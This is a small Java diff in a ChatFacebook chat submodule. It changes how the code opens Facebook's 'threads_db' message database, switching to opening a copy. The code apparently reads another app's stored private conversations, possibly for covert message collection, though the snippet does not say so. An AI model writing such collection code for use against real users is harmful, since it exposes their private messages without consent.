@@ -167,7 +167,7 @@ public class ChatFacebook extends SubModuleChat {
 			String dbFile1 = "threads_db";
 			String dbFile2 = "threads_db2";
 
-			GenericSqliteHelper helper = GenericSqliteHelper.open(dbDir, dbFile1);
+			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
 			if (helper == null) {
 				helper = GenericSqliteHelper.open(dbDir, dbFile2);
 			}
